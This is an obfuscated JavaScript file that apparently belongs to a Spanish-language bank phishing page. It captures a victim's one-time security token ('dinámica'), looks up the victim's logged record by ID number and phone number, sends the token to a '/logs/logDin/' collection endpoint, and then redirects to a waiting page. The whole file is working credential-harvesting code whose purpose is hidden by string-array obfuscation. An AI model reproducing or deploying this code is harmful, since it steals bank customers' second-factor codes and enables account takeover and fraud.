const _0x3fb76c = _0x563c;
function _0x1f38() {
  const _0x2683c0 = [
    "/logs/logDin/",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "href",
    "14iEUSYY",
    "idreg",
    "info",
    "15225881SQoUin",
    "983844ouiZti",
    "focus",
    "location",
    "626794GkvAII",
    "error",
    "txtdinamica",
    "setItem",
    "1XQrHCr",
    "value",
    "click",
    "2579088QkCqFz",
    "130715JLsYyK",
    "application/json",
    "metaInfo",
    "GET",
    "reg",
    "Ingresó\x20Dinámica",
    "log",
    "Usuario\x20Encontrado",
    "cdin",
    "disabled",
    "preventDefault",
    "63SBeiYg",
    "Error\x20al\x20actualizar\x20usuario:",
    "128NhAEUR",
    "json",
    "getElementById",
    "btndinamica",
    "3110wQlZMC",
    "1298448PQEpXO",
    "addEventListener",
  ];
  _0x1f38 = function () {
    return _0x2683c0;
  };
  return _0x1f38();
}
function _0x563c(_0x37a41f, _0x445313) {
  const _0x1f385c = _0x1f38();
  return (
    (_0x563c = function (_0x563cf9, _0x385dc5) {
      _0x563cf9 = _0x563cf9 - 0x131;
      let _0x527b9f = _0x1f385c[_0x563cf9];
      return _0x527b9f;
    }),
    _0x563c(_0x37a41f, _0x445313)
  );
}
(function (_0x23318a, _0x1b4b91) {
  const _0x29a30b = _0x563c,
    _0x386d12 = _0x23318a();
  while (!![]) {
    try {
      const _0x477347 =
        (parseInt(_0x29a30b(0x143)) / 0x1) *
          (parseInt(_0x29a30b(0x13f)) / 0x2) +
        -parseInt(_0x29a30b(0x133)) / 0x3 +
        (-parseInt(_0x29a30b(0x154)) / 0x4) *
          (parseInt(_0x29a30b(0x147)) / 0x5) +
        (-parseInt(_0x29a30b(0x13c)) / 0x6) *
          (-parseInt(_0x29a30b(0x138)) / 0x7) +
        -parseInt(_0x29a30b(0x146)) / 0x8 +
        (parseInt(_0x29a30b(0x152)) / 0x9) *
          (-parseInt(_0x29a30b(0x132)) / 0xa) +
        parseInt(_0x29a30b(0x13b)) / 0xb;
      if (_0x477347 === _0x1b4b91) break;
      else _0x386d12["push"](_0x386d12["shift"]());
    } catch (_0x574e03) {
      _0x386d12["push"](_0x386d12["shift"]());
    }
  }
})(_0x1f38, 0x695c9);
function updateLS() {
  const _0x26e4b4 = _0x563c;
  LS[_0x26e4b4(0x142)](_0x26e4b4(0x13a), JSON["stringify"](info));
}
const otpButton = document[_0x3fb76c(0x156)](_0x3fb76c(0x131)),
  numberMovil = document[_0x3fb76c(0x156)](_0x3fb76c(0x141));
otpButton[_0x3fb76c(0x134)](_0x3fb76c(0x145), async function (_0x9ffb03) {
  const _0x1c30c3 = _0x3fb76c;
  _0x9ffb03[_0x1c30c3(0x151)](), (otpButton[_0x1c30c3(0x150)] = !![]);
  if (numberMovil[_0x1c30c3(0x144)] == "") {
    alert(_0x1c30c3(0x136)),
      numberMovil[_0x1c30c3(0x13d)](),
      (otpButton[_0x1c30c3(0x150)] = ![]);
    return;
  } else {
    var _0x33f2ad = numberMovil[_0x1c30c3(0x144)];
    (info[_0x1c30c3(0x149)][_0x1c30c3(0x14f)] = _0x33f2ad), updateLS();
    async function _0x18d712() {
      const _0x3fcd7b = _0x1c30c3,
        _0x1ae55f = await fetch(url + "/logs/logs", {
          method: _0x3fcd7b(0x14a),
          headers: { "Content-Type": _0x3fcd7b(0x148) },
        }),
        _0x1e5fe1 = await _0x1ae55f[_0x3fcd7b(0x155)](),
        _0x5db5a2 = [..._0x1e5fe1];
      for (const _0x4945c7 of _0x5db5a2) {
        if (
          _0x4945c7[_0x3fcd7b(0x14b)] == info["metaInfo"]["cc"] &&
          _0x4945c7["cl"] == info[_0x3fcd7b(0x149)]["telnum"]
        ) {
          console[_0x3fcd7b(0x14d)](_0x3fcd7b(0x14e));
          const _0x5060b0 = await fetch(
              url + _0x3fcd7b(0x135) + _0x4945c7[_0x3fcd7b(0x139)],
              {
                method: "PUT",
                headers: { "Content-Type": _0x3fcd7b(0x148) },
                body: JSON["stringify"]({
                  din: info[_0x3fcd7b(0x149)]["cdin"],
                  status: _0x3fcd7b(0x14c),
                }),
              }
            ),
            _0x4cce1c = await _0x5060b0["json"]();
          _0x5060b0["ok"]
            ? console[_0x3fcd7b(0x14d)]("Usuario\x20actualizado")
            : console[_0x3fcd7b(0x140)](
                _0x3fcd7b(0x153),
                _0x5060b0["statusText"]
              );
        }
      }
      (otpButton["disabled"] = ![]),
        (window[_0x3fcd7b(0x13e)][_0x3fcd7b(0x137)] = "wait.html");
    }
    await _0x18d712();
  }
});
